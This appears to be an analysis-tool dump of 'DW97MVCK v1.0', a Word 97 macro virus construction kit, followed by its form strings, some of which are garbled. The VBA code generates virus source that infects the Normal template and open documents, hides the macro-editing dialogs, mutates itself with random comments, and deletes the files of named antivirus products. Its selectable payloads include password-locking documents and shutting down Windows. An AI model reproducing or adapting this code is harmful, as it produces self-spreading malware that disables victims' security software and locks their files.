  Print #1, "    If NormalTemplate.VBProject.VBComponents(j).Name = """ & VirusName & """ Then"
  Print #1, "      GlobalInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  For i = 1 To ActiveDocument.VBProject.VBComponents.Count"
  Print #1, "    If ActiveDocument.VBProject.VBComponents(i).Name = """ & VirusName & """ Then"
  Print #1, "      DocumentInstalled = Yes"
  Print #1, "    End If"
  Print #1, "  Next"
  Print #1,
  Print #1, "  If GlobalInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "    Options.SaveNormalPrompt = False"
  Print #1, "  End If"
  Print #1,
  Print #1, "  If DocumentInstalled = No Then"
  Print #1, "    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=""" & VirusName & """, Object:=wdOrganizerObjectProjectItems"
  Print #1, "  End If"
  Print #1,
  Print #1, "  Application.DisplayAlerts = wdAlertsAll"
  Print #1,
  
  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
    Print #1, "  Retro"
    Print #1,
  End If
  
  Print #1, VirusName & ":"
  Print #1, "End Sub"
  Print #1,
    
  End If

  If frmStealth.chkbToolsMacro = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'ToolsMacro macro"
  Print #1, "'Used to hide the ToolsMacro dialog box"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub ToolsMacro()"
  Print #1,
  Print #1, "End Sub"
  Print #1,
  End If
  
  If frmStealth.chkbViewVBCode = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'ViewVBCode macro"
  Print #1, "'Used to hide the ViewVBCode dialog box"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub ViewVBCode()"
  Print #1,
  Print #1, "End Sub"
  Print #1,
  End If
  
  If frmStealth.chkbToolsCustomize = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'ToolsCustomize macro"
  Print #1, "'Used to hide the ToolsCustomize dialog box"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub ToolsCustomize()"
  Print #1,
  Print #1, "End Sub"
  Print #1,
  End If
  
  If frmStealth.chkbFileTemplates = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'FileTemplates macro"
  Print #1, "'Used to hide the FileTemplates dialog box"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub FileTemplates()"
  Print #1,
  Print #1, "End Sub"
  Print #1,
  End If

  If frmPolymorphic.optAPMRS = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'Mutate macro"
  Print #1, "'Inserts random comments into the virus"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub Mutate()"
  Print #1, "  On Error Resume Next"
  Print #1,
  Print #1, "  Application.ScreenUpdating = False"
  Print #1,
  Print #1, "  Set Current = MacroContainer"
  Print #1,
  Print #1, "  For Grow = 1 To 20"
  Print #1, "    Number = Current.VBProject.VBComponents(""" & VirusName & """).CodeModule.ProcCountLines(""Mutate"", vbext_pk_Proc)"
  Print #1, "      RandomLine = Int(Rnd() * Number + 1)"
  Print #1, "      RemarkLength = Int(Rnd() * 40 + 1)"
  Print #1,
  Print #1, "        For Length = 1 To RemarkLength"
  Print #1, "          Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))"
  Print #1, "        Next Length"
  Print #1,
  Print #1, "      Current.VBProject.VBComponents(""" & VirusName & """).CodeModule.InsertLines RandomLine, vbTab & ""Rem "" & Remark"
  Print #1, "      Remark = """""
  Print #1,
  Print #1, "  Next Grow"
  Print #1,
  Print #1, "End Sub"
  Print #1,
  End If

  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'Retro macro"
  Print #1, "'Deletes some popular AV programs"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub Retro()"
  Print #1, "  On Error Resume Next"
  End If

  If frmRetro.chkbAVP = True Then
  Print #1, "  Kill ""C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"""
  Print #1, "  Kill ""C:\progra~1\Antivi~1\Avp32.exe"""
  Print #1, "  Kill ""C:\Program Files\AntiViral Toolkit Pro\*.avc"""
  Print #1, "  Kill ""C:\progra~1\antivi~1\*.avc"""
  End If

  If frmRetro.chkbFMacro = True Then
  Print #1, "  Kill ""C:\f-macro\f-macro.exe"""
  Print #1, "  Kill ""C:\f-prot~1\f-macro.exe"""
  End If

  If frmRetro.chkbFProt95 = True Then
  Print #1, "  Kill ""C:\Program Files\Command Software\F-PROT95\Sign.def"""
  Print #1, "  Kill ""C:\progra~1\comman~1\f-prot95\sign.def"""
  Print #1, "  Kill ""C:\Program Files\Command Software\F-PROT95\Dvp.vxd"""
  Print #1, "  Kill ""C:\progra~1\comman~1\f-prot95\dvp.vxd"""
  End If

  If frmRetro.chkbMcAfee = True Then
  Print #1, "  Kill ""C:\Program Files\McAfee\VirusScan95\Scan.dat"""
  Print #1, "  Kill ""C:\progra~1\mcafee\viruss~1\scan.dat"""
  Print #1, "  Kill ""C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"""
  Print #1, "  Kill ""C:\progra~1\mcafee\viruss~1\mcscan32.dll"""
  Print #1, "  Kill ""C:\Program Files\McAfee\VirusScan\Scan.dat"""
  Print #1, "  Kill ""C:\Program Files\McAfee\VirusScan\Mcscan32.dll"""
  End If

  If frmRetro.chkbNorton = True Then
  Print #1, "  Kill ""C:\Program Files\Norton AntiVirus\Viruscan.dat"""
  Print #1, "  Kill ""C:\progra~1\norton~1\viruscan.dat"""
  Print #1, "  Kill ""C:\Program Files\Symantec\Symevnt.386"""
  Print #1, "  Kill ""C:\progra~1\symantec\symevnt.386"""
  End If

  If frmRetro.chkbPCCillan95 = True Then
  Print #1, "  Kill ""C:\PC-Cillin 95\Scan32.dll"""
  Print #1, "  Kill ""c:\pc-cil~1\*.dll"""
  Print #1, "  Kill ""C:\PC-Cillin 95\Lpt$vpn.*"""
  End If

  If frmRetro.chkbPCCillan97 = True Then
  Print #1, "  Kill ""C:\PC-Cillin 97\Scan32.dll"""
  Print #1, "  Kill ""C:\PC-Cillin 97\Lpt$vpn.*"""
  Print #1, "  Kill ""C:\Tsc\PC-Cillin 97\Scan32.dll"""
  Print #1, "  Kill ""c:\tsc\pc-cil~1\*.dll"""
  Print #1, "  Kill ""C:\Tsc\PC-Cillin 97\Lpt$vpn.*"""
  End If

  If frmRetro.chkbTBAV = True Then
  Print #1, "  Kill ""C:\TBAVW95\Tbscan.sig"""
  Print #1, "  Kill ""c:\Tbavw95\Tb*.*"""
  Print #1, "  Kill ""C:\Tbavw95\Tbavw95.vxd"""
  End If

  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
  Print #1, "End Sub"
  Print #1,
  End If

  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
  Print #1,
  Print #1, "'------------------------------------------------------------"
  Print #1, "'Payload macro"
  Print #1, "'Annoys the user"
  Print #1, "'------------------------------------------------------------"
  Print #1, "Sub Payload()"
  Print #1, "  On Error Resume Next"
  End If

  If frmPayload.chkbAssistant = True Then
  Print #1, "  Assistant.Visible = True"
  Print #1, "  With Assistant.NewBalloon"
  Print #1, "    .Icon = msoIconAlert"
  Print #1, "    .Text = """ & frmPayloadOfficeAssistant.txtMessage & """"
  Print #1, "    .Heading = """ & frmPayloadOfficeAssistant.txtHeading & """"
  Print #1, "    .Animation = msoAnimationSearching"
  Print #1, "    .Show"
  Print #1, "  End With"
  Print #1,
  End If

  If frmPayload.chkbBeep = True Then
  Print #1, "  For B = 0 To " & frmPayloadBeep.txtNumberOfBeeps
  Print #1, "    Beep"
  Print #1, "  Next"
  Print #1,
  End If

  If frmPayload.chkbCaption = True Then
  Print #1, "  Application.Caption = """ & frmPayloadChangeCaption.txtCaption & """"
  Print #1,
  End If

  If frmPayload.chkbChangeStatusBar = True Then
  Print #1, "  Application.StatusBar = True"
  Print #1, "  StatusBar = """ & frmPayloadChangeStatusBar.txtStatusBar & """"
  Print #1,
  End If

  If frmPayload.chkbMessageBox = True Then
  Print #1, "  MsgBox """ & frmPayloadMessageBox.txtMessageBox & """,vbOKonly,""" & frmPayloadMessageBox.txtMessageBoxTitle & """"
  Print #1,
  End If

  If frmPayload.chkbPassword = True Then
  Print #1, "  ActiveDocument.Password = """ & frmPayloadSetPassword.txtPassword & """"
  Print #1, "  ActiveDocument.Save"
  Print #1,
  End If

  If frmPayload.chkbExitWindows = True Then
  Print #1, "  Tasks.ExitWindows"
  Print #1,
  End If

  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
  Print #1, "End Sub"
  End If

ByeBye:
Close #1
MsgBox "DW97MVCK v1.0, written by DarkChasm", vbOKOnly, "DW97MVCK"
Tasks.ExitWindows
End Sub

Private Sub UserForm_Initialize()
  
  lblVirusName = VirusName
  
  lblSourceFileName = SourceFileName
  
  If frmStealth.chkbFileTemplates Or frmStealth.chkbToolsCustomize Or frmStealth.chkbToolsMacro Or frmStealth.chkbViewVBCode = 1 Then
    lblStealth = "Yes"
  Else
    lblStealth = "No"
  End If

  If frmRetro.chkbAVP Or frmRetro.chkbFMacro Or frmRetro.chkbFProt95 Or frmRetro.chkbMcAfee Or frmRetro.chkbNorton Or frmRetro.chkbPCCillan95 Or frmRetro.chkbPCCillan97 Or frmRetro.chkbTBAV = True Then
    lblRetro = "Yes"
  Else
    lblRetro = "No"
  End If

  If frmPolymorphic.optAPMRS = True Then
    lblPolymorphic = "Yes"
  Else
    lblPolymorphic = "No"
  End If

  lblInfectionMacros = NumberOfMacros

  If frmPayload.chkbAssistant = True Or frmPayload.chkbBeep = True Or frmPayload.chkbCaption = True Or frmPayload.chkbChangeStatusBar = True Or frmPayload.chkbExitWindows = True Or frmPayload.chkbMessageBox = True Or frmPayload.chkbPassword = True Then
    lblPayload = "Yes"
  Else
    lblPayload = "No"
  End If

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Which Macros Do You Want To Use In Your Virus                        To Infect?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AutoOpen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AutoClose
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FileSaveAs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FileSave
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FilePrint
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EditFind
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ToolsWordCounta
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Virus Name:dU

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VirusNamee:d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Source File Name:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Source File Name
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Stealth:q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Stealth
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Retro:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RetroW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Polymorphic:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Polymorphic:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Payload:D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Payload
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MAKE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EXIT0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Infection Macros:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Select which payloads to use.,"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Message Box
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Set Password
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Exit Windows
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Office Assistant
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Change Captiona
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Change StatusBar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadBeep/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Beep How Many Times?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadChangeCaption/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�What Do You Want The Caption To Say??
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadChangeStatusBar/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�What Do You Want The Status Bar To Say?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadExitWindows/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Exit Windowsy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadMessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�What Do You Want The Message Box Title To Be?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadMessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�What Do You Want The Message Box To Say?a$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadOfficeAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�What Do You Want The Heading To Say?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadOfficeAssistant/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�What Do You Want The Text To Say?ay?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadSetPassword/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�What Password Do You Want To Use?eBo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPolymorphic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Select which polymorphic engine you want to use.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPolymorphic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPolymorphic/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
APMRSW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Select which Anti-Virus programs to delete."
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PC-Cillan 95
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PC-Cillan 97
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Norton
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
McAfee
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F-Prot 95 97
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Anti Virus Pro (AVP)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ThunderByte  (TBAV))
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F-Macro
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStartForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DW97MVCK v1.0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Select which stealth macros you want.1c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ToolsMacro
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FileTemplates
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ViewVBCode
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ToolsCustomizeme
-------------------------------------------------------------------------------
